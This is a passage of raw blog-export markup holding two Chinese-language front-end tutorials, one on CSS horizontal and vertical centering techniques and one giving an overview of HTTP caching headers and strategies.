class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.center &#123; text-align:center; width: 200px; height:100px; border:1px solid red; &#125;</span><br><span class=\"line\">.centerChild &#123; width:100px; height:100px; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div class=&quot;center&quot;&gt;</span><br><span class=\"line\">    &lt;div style=&quot;display:inline&quot;&gt;aaa&lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div class=&quot;center&quot;&gt;</span><br><span class=\"line\">    &lt;div style=&quot;display:inline-block&quot;&gt;aaa&lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- or 原生inline-block元素 --&gt;</span><br><span class=\"line\">&lt;div class=&quot;center&quot;&gt;</span><br><span class=\"line\">    &lt;img src=&quot;1.jpg&quot; class=&quot;centerChild&quot;&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"padding–水平垂直居中\"><a href=\"#padding–水平垂直居中\" class=\"headerlink\" title=\"padding–水平垂直居中\"></a>padding–水平垂直居中</h2><p>通过在内容的上下左右添加同样的距离，来反向达到内容居中的效果。通过这种方法实现居中，限制条件比较多。这种居中相当于在模拟标准盒模型，父级相当于border，子级相当于content，二者的宽高通过padding相互制约。所以一般不使用padding来做居中，它经常的使用场景是，在一块内容分区的边线内的四面留白。如下图红线框起来的内容区和外边框之间的留白<br><img src=\"http://o798x2hdw.bkt.clouddn.com/align/3.png\" alt=\"align/3\"></p>\n<h2 id=\"margin-0-auto–水平居中\"><a href=\"#margin-0-auto–水平居中\" class=\"headerlink\" title=\"margin 0 auto–水平居中\"></a>margin 0 auto–水平居中</h2><p>最常使用的是margin:xx auto，可以令子级水平居中，但是在上下margin上设定auto却不能令其垂直居中，这是由CSS2规范的规定决定的^1。</p>\n<p>原理是，CSS2规范规定：</p>\n<blockquote>\n<p>块级元素在普通流内布局按以下公式：左m+左b+左p+w+右p+右b+右m = 包含块宽度<br>如果宽度w不是auto，并且左margin和右margin都是auto的话，两者相等。</p>\n</blockquote>\n<p>然而纵向margin没有规定，于是就不能垂直居中。</p>\n<p><strong>限制条件是：</strong></p>\n<ol>\n<li>父级子级均为block元素</li>\n<li>父级子级宽度固定</li>\n<li>并且处于正常文档流中</li>\n</ol>\n<p><strong>失效情况：</strong></p>\n<ol>\n<li>如果子级是inline元素或者inline-block元素，居中会失效；</li>\n<li>如果没有设定父级宽度，居中会失效；</li>\n<li>如果子级宽度为auto那就整行撑满父级，宽度等于父级了，也就没有什么居中不居中了；</li>\n<li>子级设定了绝对定位或者固定定位，脱离了正常文档流，居中会失效；</li>\n<li>另外如果不写DOCTYPE或者写的不正确也会导致失效。</li>\n</ol>\n<h2 id=\"absolute-left-top-50-margin为宽-高一半的负值–水平垂直居中\"><a href=\"#absolute-left-top-50-margin为宽-高一半的负值–水平垂直居中\" class=\"headerlink\" title=\"absolute + left/top 50% + margin为宽/高一半的负值–水平垂直居中\"></a>absolute + left/top 50% + margin为宽/高一半的负值–水平垂直居中</h2><p><strong>限制条件：</strong></p>\n<ol>\n<li>父级定位relative，子级定位absolute,</li>\n<li>子级宽度确定<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.father &#123; border:2px solid #f77; height:100px; width:300px; position:relative; &#125;</span><br><span class=\"line\">.child &#123; width:100px; height:100px; background:#7c7; position:absolute; left:50%;  margin-left:-50px;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div class=&quot;father&quot;&gt;</span><br><span class=\"line\">    &lt;div class=&quot;child&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com/align/4.png\" alt=\"align/4\"></p>\n<p>margin负值的重要作用有^2：</p>\n<ol>\n<li><p>相对自身偏移，达到的视觉效果相当于<code>position：relative; top：-xx; left:-xx; right:-xx; bottom:-xx</code>，但与之的区别在于，relative偏移后仍占据原来的位置，margin负值的偏移连原来占据的位置也会偏移，常利用这点，设置左上的margin负值，遮盖左边或者上边的border，如果设置右下的，则会被后面的内容遮住。</p>\n</li>\n<li><p>扩展宽度例如</p>\n</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">div &#123; width:432px; background:#999; &#125;</span><br><span class=\"line\">ul &#123; margin-right: -10px; height:200px; border:1px solid #f77; padding:0;&#125;</span><br><span class=\"line\">li &#123; width:100px; margin-right:10px; float:left; height:100px; background:#7c7; list-style: none;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div&gt;</span><br><span class=\"line\">    &lt;ul&gt;</span><br><span class=\"line\">        &lt;li&gt;&lt;/li&gt;</span><br><span class=\"line\">        &lt;li&gt;&lt;/li&gt;</span><br><span class=\"line\">        &lt;li&gt;&lt;/li&gt;</span><br><span class=\"line\">        &lt;li&gt;&lt;/li&gt;</span><br><span class=\"line\">    &lt;/ul&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com/align/5.png\" alt=\"align/5\"></p>\n<h2 id=\"absolute-left-top-50-transform-translate–水平垂直居中\"><a href=\"#absolute-left-top-50-transform-translate–水平垂直居中\" class=\"headerlink\" title=\"absolute + left/top 50% + transform translate–水平垂直居中\"></a>absolute + left/top 50% + transform translate–水平垂直居中</h2><p>上面的居中方法有一个限制是必须知道子级的宽高，CSS3中的transform的translate可以基于自身尺寸设定百分数，这样就不用知道子级的宽高，也能做到居中了。此方法从张鑫旭大神博客学来^3，感谢大神。<br>缺点： IE9(-ms-), IE10+以及其他现代浏览器才支持<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.father &#123; position:relative; </span><br><span class=\"line\">          width:300px; height: 300px; border:1px solid red;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">.child &#123; position:absolute; </span><br><span class=\"line\">         left:50%; </span><br><span class=\"line\">         top:50%;</span><br><span class=\"line\">         transform: translate(-50%, -50%);</span><br><span class=\"line\"></span><br><span class=\"line\">         width:100px; height: 100px; background: #7c7;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&lt;div class=&quot;father&quot;&gt;</span><br><span class=\"line\">    &lt;div class=&quot;child&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com/align/6.png\" alt=\"align/6\"></p>\n<h2 id=\"margin：auto-absolute-0-0-0-0–水平垂直居中\"><a href=\"#margin：auto-absolute-0-0-0-0–水平垂直居中\" class=\"headerlink\" title=\"margin：auto + absolute 0 0 0 0–水平垂直居中\"></a>margin：auto + absolute 0 0 0 0–水平垂直居中</h2><p>比起上面的方法，可以兼容IE8+浏览器，同样来自张鑫旭大神^3，出来效果同上</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.father &#123; position:relative; </span><br><span class=\"line\">          width:300px; height: 300px; border:1px solid red;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">.child &#123; position:absolute; </span><br><span class=\"line\">         left:0;</span><br><span class=\"line\">         top:0; </span><br><span class=\"line\">         right: 0; </span><br><span class=\"line\">         bottom: 0;</span><br><span class=\"line\"></span><br><span class=\"line\">         margin:auto;</span><br><span class=\"line\"></span><br><span class=\"line\">         width:100px; height: 100px; background: #7c7; </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div class=&quot;father&quot;&gt;</span><br><span class=\"line\">    &lt;div class=&quot;child&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<p>简单翻译下原理 ^4：</p>\n<ol>\n<li>正常文档流内，对于top和bottom，margin为auto，等同于margin等于零；</li>\n<li>absolute使之脱离正常文档流，此时的margin auto相当于不起作用了；</li>\n<li>设定四面都为0后，浏览器会在设定了relative的父元素内，贴近父元素的border设置一个边界盒子（bound box），此时，边界盒子占满父元素所有空间；</li>\n<li>给子元素设定了宽或者高，就阻止其占满父元素所有空间，迫使浏览器基于边界盒子重新计算margin：auto；</li>\n<li>现在元素是绝对定位，非正常文档流，浏览器计算margin：auto时，就让上下margin相等（基于规范规定），这样元素就居中于边界盒子（bound box），也就居中于父元素了。</li>\n</ol>\n<h2 id=\"table-cell-vertical-align-–水平居中\"><a href=\"#table-cell-vertical-align-–水平居中\" class=\"headerlink\" title=\"table-cell + vertical-align –水平居中\"></a>table-cell + vertical-align –水平居中</h2><p>如果是在td元素中，可以直接使用属性valign=”middle”做垂直居中，align=”center”做水平居中<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">td &#123; width:300px; height: 300px; border:1px solid red; &#125;</span><br><span class=\"line\">.tdChild &#123; width:100px; height: 100px; background: #7c7; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;td valign=&quot;middle&quot; align=&quot;center&quot;&gt;</span><br><span class=\"line\">    &lt;div class=&quot;tdChild&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;/td&gt;</span><br></pre></td></tr></table></figure></p>\n<p>如果没有table，没有td元素，可以用css这样写：<br>这种方法，子级不需要大小固定，可以用于：多行文字居中、大小不固定图片的居中<br>有一个疑问，许多博客写这种方法的时候，都要给.father再加一个父级，让这个父级display:table,我不知道为什么要这么加，因为不加的时候就可以居中。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.father &#123;</span><br><span class=\"line\">    display: table-cell;</span><br><span class=\"line\">    vertical-align: middle;</span><br><span class=\"line\">     </span><br><span class=\"line\">    width:300px; </span><br><span class=\"line\">    height: 300px; </span><br><span class=\"line\">    border:1px solid red;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.child &#123; display: inline-block; background: #7c7; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div class=&quot;father&quot;&gt;</span><br><span class=\"line\">    &lt;div class=&quot;child&quot;&gt;dafsdf sda sdf sdfas sdf&lt;br&gt;dsfasd sdf dd &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"css3-flex居中–水平垂直居中\"><a href=\"#css3-flex居中–水平垂直居中\" class=\"headerlink\" title=\"css3 flex居中–水平垂直居中\"></a>css3 flex居中–水平垂直居中</h2><p>兼容性不太好，适用于手机端开发，水平垂直居中：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.father &#123; display:-webkit-box;</span><br><span class=\"line\">    -webkit-box-align:center;</span><br><span class=\"line\">    -webkit-box-pack:center;</span><br><span class=\"line\">    </span><br><span class=\"line\">    width:300px; </span><br><span class=\"line\">    height: 300px; </span><br><span class=\"line\">    border:1px solid red; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\">.child &#123; display:-webkit-flex; </span><br><span class=\"line\"></span><br><span class=\"line\">    width: 100px; </span><br><span class=\"line\">    height:100px; </span><br><span class=\"line\">    background: #7c7; </span><br><span class=\"line\">    margin-bottom:10px;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;div class=&quot;father&quot;&gt;</span><br><span class=\"line\">    &lt;div class=&quot;child&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com/align/7.png\" alt=\"align/7\"></p>\n<p>本人常用的就是这些居中方法了，还有一些居中方式，本人比较不常用，由于精力有限就不加了。另外小可才疏学浅，时间仓促，如有错漏处，请大力批评！另外的另外，写博客真累，但是也真的很有成就感呀，赫赫~~</p>\n<blockquote>\n<p>本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 <a href=\"mailto:miao.hnlk@gmail.com\" target=\"_blank\" rel=\"noopener\">miao.hnlk@gmail.com</a><br>本文地址：<a href=\"http://luckymona.github.io/2016/09/08/summary-of-aligning-to-center-solutions-in-css\" target=\"_blank\" rel=\"noopener\">http://luckymona.github.io/2016/09/08/summary-of-aligning-to-center-solutions-in-css</a></p>\n</blockquote>\n<p>参考链接：</p>\n<p>^1:<a href=\"https://www.zhihu.com/question/21644198\" target=\"_blank\" rel=\"noopener\">为什么「margin:auto」可以让块级元素水平居中？</a><br>^2:<a href=\"http://www.cnblogs.com/2050/archive/2012/08/13/2636467.html\" target=\"_blank\" rel=\"noopener\">CSS布局奇淫巧计之-强大的负边距</a><br>^3:<a href=\"http://www.zhangxinxu.com/wordpress/2013/11/margin-auto-absolute-%E7%BB%9D%E5%AF%B9%E5%AE%9A%E4%BD%8D-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E5%B1%85%E4%B8%AD/\" target=\"_blank\" rel=\"noopener\">小tip: margin:auto实现绝对定位元素的水平垂直居中</a><br>^4:<a href=\"https://www.smashingmagazine.com/2013/08/absolute-horizontal-vertical-centering-css\" target=\"_blank\" rel=\"noopener\">Absolute Horizontal And Vertical Centering In CSS</a></p>"},{"title":"HTTP缓存机制大局观","date":"2018-03-02T13:30:00.000Z","toc":true,"comments":1,"_content":"网上介绍HTTP缓存机制的博客思路通常是挨个介绍HTTP缓存涉及的多个字段，这样通读下来感觉印象不深刻，并且缺少大局观，本文将尝试从更总览的角度进行总结和概括，以帮助建立知识体系。\n\n<!-- more -->\n\n> by MaryTien from  [http://supermaryy.com](http://luckymona.github.com)\n\n## 前言及缓存字段分类\n\n前端涉及到缓存这一概念的地方包括HTTP缓存、以`localStorage`为代表的本地存储缓存（`sessionStorage`、`indexDB`、`web SQL`等），本文主要介绍HTTP缓存。HTTP请求中只有GET请求可以被缓存。\n\n网上介绍HTTP缓存机制的博客思路通常是挨个介绍HTTP缓存涉及的多个字段，这样通读下来感觉印象不深刻，并且缺少大局观，本文将尝试从更总览的角度进行总结，阅读这篇文章可以帮助你产生一点大菊观，明白轻重缓急，如果看了却产生不了，那你当我是浮夸吧，夸张只因我孩怕XDD。。\n\n缓存是一种保存资源副本并在下次请求时直接使用该副本的技术。设置缓存的好处：减少资源显示时间提升性能；减少服务器压力。HTTP缓存机制使用多个字段来实现缓存控制，把这些字段进行分类有利于记忆和加深理解，经过梳理总结我发现大家会对这些字段有以下几种分类方法：\n\n### 1. 按照缓存判断的执行过程，分为：###\n\n参考自[【腾讯Bugly干货分享】彻底弄懂 Http 缓存机制 - 基于缓存策略三要素分解法](https://zhuanlan.zhihu.com/p/24467558)\n\n- 缓存存储策略：`Cache-Control: public、private、no-cache、max-age、no-store`\n\n  前4项都可以缓存数据到本地，后者 `no-store` 则不会在客户端缓存任何响应数据。\n\n- 缓存过期策略：`Expires`、`Cache-Control`设置`max-age`、`no-cache`的情况\n\n- 缓存对比策略：`Etag/If-None-Match`、`Last-Modified/If-Modified-Since`\n\n其中`max-age`和`no-cache`是个混合体，可以同时设置两个类别的内容，既包含缓存存储策略，也包含缓存过期策略，`Cache-Control:max-age=3600`相当于\n\n```\nCache-Control:private/public\nExpires:<当前时间> + 3600\n```\n\n`Cache-Control:no-cache`相当于`Cache-Control:max-age=0`，相当于\n\n```\nCache-Control:private/publice\nExpires:<当前时间>\n```\n\n在这种分类下，浏览器会依次根据**是否存储、是否过期、是否对比一致**来进行缓存判断，如果设置时缺失某一项，浏览器会根据约定好的规则为这一项设置默认值。例如没有设定具体过期时间时，浏览器会根据以下**启发式缓存过期策略**设定过期时间：\n\n**把响应头中的Date字段和Last-Modified的差值的10%作为max-age的值，也就是作为缓存有效期**\n\n### 2.按照HTTP不同版本的字段，分为：\n\n- HTTP1.0中的字段：Pragma、Expires\n\n- HTTP1.1中的字段：Cache-Control、Etag / If-None-Match、Last-Modified / If-Modified-Since等\n\n  这种分类主要强调的是两点：\n\n  1. 关于Pragma：设置了Pragma就相当于设置了Cache-Control：no-cache，但是HTTP响应头不支持这个属性，所以它不能拿来完全替代HTTP/1.1中定义的Cache-control头。通常定义Pragma以向后兼容基于HTTP/1.0的客户端，如低版本IE浏览器。\n  2. 同时设置了max-age和Expires的情况下，Expires被覆盖，以max-age为准\n\n### 3.按照使用频率，分为：###\n\n- 主要字段：Expires、Cache-Control、Etag / If-None-Match、Last-Modified / If-Modified-Since\n- 辅助字段：Vary、Date、Age\n\n### 4.按照能否被请求头、响应头支持，分为：###\n\n参考自[rfc2616 14.Header Field Definitions](https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html)\n\n​           [浅谈浏览器http的缓存机制-Vajoy](http://www.cnblogs.com/vajoy/p/5341664.html)\n\n- 请求头字段(request-header)：If-Match、If-None-Match、If-Modified-Since、If-Unmodified-Since\n\n- 响应头字段(response-header)：Age、Etag\n\n- 通用头部字段(general-header)：Cache-Control、Date、Pragma\n\n- 实体首部字段(entity-header )：Expires、Last-Modified、\n\n实体首部字段定义：For entity-header fields, both sender and recipient refer to either the client or the server, depending on who sends and who receives the entity。在我理解，这样也就是说Client或Server可以作为接收端或发送端，具体取决于它们在一次首发过程中扮演的角色，也就是说既可以出现在请求头中也可以出现在响应头中吗？这点还不太理解。（TODO）\n\n以下是表格：\n\n   **1. 通用首部字段**（就是请求报文和响应报文都能用上的字段）\n   ![img](https://images2015.cnblogs.com/blog/561179/201604/561179-20160401161150504-1030837643.png)\n\n   **2. 请求首部字段**\n   ![img](https://images2015.cnblogs.com/blog/561179/201604/561179-20160401161240301-2050921595.png)\n\n   **3. 响应首部字段**\n   ![img](https://images2015.cnblogs.com/blog/561179/201604/561179-20160401161311394-1246877214.png)\n\n   **4. 实体首部字段**\n   ![img](https://images2015.cnblogs.com/blog/561179/201604/561179-20160401171410441-767100632.png)\n\n但是，MDN上说HTTP响应头不支持Pragma（TODO），并且通常Last-Modified会用在响应头里面。\n\n## 一、常用缓存字段\n\n### 1. 主要字段：\n\n#### 1.Expires\n\n- HTTP1.0时期的缓存过期控制字段，是相对于服务器时间的绝对时间，不同服务器之间的时间设置可能不同，这种不一致存在隐患\n- 值为GMT格式的日期，设定在当前时间之前相当于立即过期，相当于Cache-Control：no-cache\n- 与Cache-Control：max-age=<毫秒数>共存时，被其覆盖并失效\n- Pragma与Expires共存时，Pragma胜出，Expires失效\n\n#### 2.Cache-control\n\n- **public/private**\n\n  `public`表明响应可以被任何对象（包括：发送请求的客户端，代理服务器，等等）缓存。\n\n  `private`表明响应只能被单个用户缓存，不能作为共享缓存（即代理服务器不能缓存它）。\n\n- **max-age**\n\n  值为一个毫秒数，表示缓存过期的相对时间，优先级高于Expires\n\n- **s-maxage=<seconds>**\n\n  覆盖max-age 或者 Expires 头，但是仅适用于共享缓存(比如各个代理)，并且私有缓存中它被忽略。\n\n- **no-cache**\n\n  允许保存缓存副本 ，但是不能直接使用缓存副本，必须先去服务器提交验证请求，验证是否过期、已修改，如果验证没有过期、没有修改，即返回304状态，就可以使用缓存副本\n\n- **no-store**：不允许保存缓存副本\n\n- **must-revalidate**\n\n  缓存必须在使用之前验证旧资源的状态，并且不可使用过期资源。和no-cache比较相似\n\n- **min-fresh=<seconds>**\n\n  表示客户端希望在指定的时间内获取最新的响应。\n\n若报文中同时出现了 Pragma、Expires 和 Cache-Control，会以 Cache-Control 为准，其它Cache-Control值略\n\n#### 3.Etag / If-None-Match\n\n- 服务器端为资源打的一个标记，标记资源有无修改，服务端资源修改后就修改Etag值\n- “W\\”开头的Etag表示开启弱校验，当有了较多修改之后才会修改Etag值，默认使用强校验，即按字节进行对比\n\n#### 4.Last-Modified / If-Modified-Since\n\n- Last-Modified标记资源最后被修改的时间，是一个GMT格式的时间值\n- 如果在服务器上，一个资源被修改了，但其实际内容根本没发生改变，会因为Last-Modified时间匹配不上而返回了整个实体给客户端*（即使客户端缓存里有个一模一样的资源）*，所以通常配合Etag一起使用，可以达到较好的控制缓存的效果\n- 如果 Last-Modified 和 ETag 同时被使用，则要求它们的验证都必须通过才会返回304，若其中某个验证没通过，则服务器会按常规返回资源实体及200状态码。\n\n### 2. 辅助字段：\n\n#### 1.Vary\n\n参考[MDN|HTTP缓存](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ)\n\n控制代理服务器直接使用缓存资源返回还是向源服务器发起请求。当缓存服务器收到一个请求，只有当前的请求和原始（缓存）的请求头跟缓存的响应头里的Vary都匹配，才能使用缓存的响应。\n\n![The Vary header leads cache to use more HTTP headers as key for the cache.](https://mdn.mozillademos.org/files/13769/HTTPVary.png)\n\n使用vary头有利于内容服务的动态多样性。例如，使用Vary: User-Agent头，缓存服务器需要通过UA判断是否使用缓存的页面。如果需要区分移动端和桌面端的展示内容，利用这种方式就能避免在不同的终端展示错误的布局。另外，它可以帮助google或者其他搜索引擎更好地发现页面的移动版本，并且告诉搜索引擎没有引入[Cloaking](https://en.wikipedia.org/wiki/Cloaking)。\n\n#### 2.Date和Age\n\nDate 是原服务器发送该资源响应报文的时间（GMT格式），如果你发现 Date 的时间与“当前时间”差别较大，或者连续F5刷新发现 Date 的值都没变化，则说明你当前请求是命中了代理服务器的缓存。\n\nAge表示资源在代理服务器中存在的时间*（秒）*，如文件被修改或替换，Age会重新由0开始累计。\n\n```\n静态资源Age + 静态资源Date = 原服务端Date\n```\n\n不过这条规则也不一定准确，特别是当原服务器经常修改系统时间的情况下。\n\n## 二、缓存判断流程\n\n参考[Google Developer HTTP缓存](https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn)\n\n![缓存决策树](http://7xpsmd.com1.z0.glb.clouddn.com/16-2-23/28130284.jpg)\n\n\n\n这个图可以说是设置缓存的参考策略，也可以据此判断浏览器判断是否使用缓存的大概流程：\n\n1. 由Expires、Pragma、max-age等判断缓存是否过期，未过期直接使用缓存，已过期进行下一步\n\n2. 发起请求，请求头附带If-None-Match和If-Modified-Since，服务器由If-Modified-Since与其Last-Modified对比，如果不一致直接反回新版本的资源，否则需要再判断If-None-Match和Etag是否一致，如果不一致直接返回新版本资源，否则返回304状态码，浏览器就可以直接使用本地的缓存副本\n\n![浏览器的缓存判断流程](http://7xpsmd.com1.z0.glb.clouddn.com/16-2-23/8668139.jpg)\n\n另外需要注意的是，Chrome浏览器中，当缓存未过期直接使用缓存时，在Dev Tools的network选项卡中显示的是200 OK (from cache)。\n\n## 三、前端设置\n\n### 1. HTTP header字段设置###\n\n涉及到前端人员需要设置的HTTP header字段有哪些呢？通过前面按照能否被请求头、响应头支持这一标准进行的分类中，我们知道请求首部字段有：If-Match / If-None-Match、If-Modified-Since / If-Unmodified-Since，这几个值通常是首先服务器发回Etag、Last-Modified，然后浏览器自动加在请求头里面的，所以一般不用前端人员进行设置。**通用首部字段有：Cache-Control、Pragma，也就是说作为前端人员，可以通过对这两个字段进行设置以控制缓存。**（TODO）\n\n### 2. Meta http-equiv设置缓存###\n\nHTML4中支持在meta标签的http-equiv属性中使用http头部缓存控制字段，包括Expires、Pragma、Cache-Control等。\n\n```\n<meta http-equiv=\"Cache-Control\" content=\"no-cache, no-store, must-revalidate\" />\n<meta http-equiv=\"Pragma\" content=\"no-cache\" />\n<meta http-equiv=\"Expires\" content=\"0\" />\n```\n\n> The [http-equiv](https://www.w3.org/TR/html4/struct/global.html#adef-http-equiv) attribute can be used in place of the name attribute and has a special significance when documents are retrieved via the Hypertext Transfer Protocol (HTTP). HTTP servers may use the property name specified by the [http-equiv](https://www.w3.org/TR/html4/struct/global.html#adef-http-equiv) attribute to create an [[RFC822\\]](https://www.w3.org/TR/html4/references.html#ref-RFC822)-style header in the HTTP response. Please see the HTTP specification ([[RFC2616\\]](https://www.w3.org/TR/html4/references.html#ref-RFC2616)) for details on valid HTTP headers.\n\n参考自[w3.org | HTML4 | META and HTTP headers](https://www.w3.org/TR/html4/struct/global.html#h-7.4.4)\n\nHTML5中已经不再包含这样的用法。参考自[w3.org | HTML5 | META Pragma directives](https://dev.w3.org/html5/spec-preview/the-meta-element.html#pragma-directives)\n\n当同时在meta标签中设置了缓存控制字段并在HTTP header中设置了这些字段时，会优先使用HTTP header字段。另外有的代理服务器可能会不认这个设置，为了避免造成冲突和混乱，建议只使用HTTP header设置缓存。另外META http-equiv适用于在file:// 本地文件中使用。\n\n> **[HTML meta tags vs HTTP response headers](https://stackoverflow.com/questions/49547/how-to-control-web-page-caching-across-all-browsers)**\n>\n> Important to know is that when a HTML page is served over a HTTP connection, and a header is present in **both** the HTTP response headers and the HTML `<meta http-equiv>` tags, then the one specified in the HTTP response header will get precedence over the HTML meta tag. The HTML meta tag will only be used when the page is viewed from local disk file system via a `file://` URL. See also [W3 HTML spec chapter 5.2.2](http://www.w3.org/TR/html4/charset.html#h-5.2.2). Take care with this when you don't specify them programmatically, because the webserver can namely include some default values.\n>\n> Generally, you'd better just **not** specify the HTML meta tags to avoid confusion by starters, and rely on hard HTTP response headers. Moreover, specifically those `<meta http-equiv>` tags are [**invalid**](http://validator.w3.org/) in HTML5. Only the `http-equiv` values listed in [HTML5 specification](http://dev.w3.org/html5/spec-preview/the-meta-element.html#attr-meta-http-equiv) are allowed.\n\n### 3.给静态资源加版本号Revved Resource###\n\n更多地利用缓存资源，可以提高网站的性能和相应速度。为了优化缓存，过期时间设置得尽量长是一种很好的策略。对于定期或者频繁更新的资源，这么做是比较稳妥的，但是对于那些长期不更新的资源会有点问题。这些固定的资源在一定时间内受益于这种长期保持的缓存策略，但一旦要更新就会很困难。特指网页上引入的一些js/css文件，当它们变动时需要尽快更新线上资源。\n\nweb开发者发明了一种 Steve Sounders 称作加速（译者注：revving）的技术[[1\\]](https://www.stevesouders.com/blog/2008/08/23/revving-filenames-dont-use-querystring/) 。不频繁更新的文件会使用特定的命名方式：在URL后面（通常是文件名后面）会加上版本号。加上版本号后的资源就被视作一个完全新的独立的资源，同时拥有一年甚至更长的缓存过期时长。但是这么做也存在一个弊端，所有引用这个资源的地方都需要更新链接。web开发者们通常会采用自动化构建工具在实际工作中完成这些琐碎的工作。当低频更新的资源（js/css）变动了，只用在高频变动的资源文件（html）里做入口的改动。\n\n## 四、设置规则\n\n1. 为基本不会变动的资源设置非常长的过期时间，例如Image、Fonts、jQuery库文件等，以年为单位，例如淘宝网的logo图片设置了一年的max-age值\n\n2. 为定时变动的资源设置中等过期时间，例如CSS文件、JS文件，以版本更替的时间间隔为参考进行设置，如果在过期时间之前需要发新版本，为避免用户仍访问本地副本（因为本地副本还未过期），可使用加版本号的做法\n\n3. HTML文档不使用缓存或谨慎设定过期时间，因为其他资源（图片、CSS、JavaScript 等）的请求都来自一个单一的HTML 文档，如果被缓存了，那么页面中包含的资源的文件名等信息都会一并被缓存，导致对它的更新难以确保立即对用户生效。（TODO）\n\n一个网站，说白了就是HTML+JS+CSS+fonts+img 